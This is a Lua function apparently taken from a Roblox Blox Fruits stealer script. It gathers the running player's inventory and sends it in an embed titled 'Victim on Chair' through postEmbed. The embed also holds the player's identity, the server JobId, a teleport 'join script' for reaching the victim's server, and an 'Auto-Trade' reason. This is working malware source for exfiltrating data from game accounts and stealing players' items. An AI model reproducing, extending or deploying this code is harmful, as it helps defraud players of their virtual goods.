local function sendInventoryEmbed(reason)
    if tick() - lastEmbedAt < 4 then return false end
    lastEmbedAt = tick()

    local inv, srcInfo = getInventory()
    local fruitLines, premiumLines, otherLines = {}, {}, {}

    for _, item in ipairs(inv) do
        local line = string.format("`%s` x%d", tostring(item.Name), item.Count or 1)
        local cls = classify(item)
        if cls == "fruit" then fruitLines[#fruitLines + 1] = line
        elseif cls == "premium" then premiumLines[#premiumLines + 1] = line
        else otherLines[#otherLines + 1] = line end
    end
    if #fruitLines == 0 then fruitLines = { "None found" } end
    if #premiumLines == 0 then premiumLines = { "None found" } end

    local joinScript = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", game.PlaceId, game.JobId)
    local srcSummary = string.format("CommF=%s | Gui=%s | Tools=%s",
        tostring(srcInfo.CommF), tostring(srcInfo.Gui), tostring(srcInfo.Tools))

    local fields = {
        { name = "⚡ Fruits (" .. #fruitLines .. ")", value = "```\n" .. table.concat(fruitLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
        { name = "💎 Premium / Skins (" .. #premiumLines .. ")", value = "```\n" .. table.concat(premiumLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
        { name = "🌐 Join Script (PC)", value = "```lua\n" .. joinScript .. "\n```", inline = false },
        { name = "📱 Join Script (Mobile)", value = joinScript, inline = false },
    }
    if #otherLines > 0 then
        table.insert(fields, 1, { name = "📦 Other (" .. #otherLines .. ")", value = "```\n" .. table.concat(otherLines, "\n"):sub(1, 1000) .. "\n```", inline = false })
    end
    table.insert(fields, { name = "🔍 Sources", value = "```\n" .. srcSummary .. "\n```", inline = false })

    local embed = {
        title = "🍇 Blox Fruits — Victim on Chair",
        description = string.format(
            "**Victim:** [%s](https://www.roblox.com/users/%d/profile)\n**Server:** `%s`\n**Reason:** %s\n**Total Items:** %d",
            LP.Name, LP.UserId, game.JobId, reason or "Auto-Trade", #inv
        ),
        color = #inv > 0 and 0x00FF00 or 0xFF0000,
        thumbnail = { url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", LP.UserId) },
        fields = fields,
        footer = { text = "ofx in the corner" },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    }
    postEmbed(embed)

    -- If empty, dump the raw CommF shape so you can SEE what the game returned
    if #inv == 0 and lastRawInv then
        task.delay(1, function()
            postDebugDump("CommF raw — parser found nothing (" .. tostring(lastInvSource) .. ")", lastRawInv)
        end)
    end
    return true
end

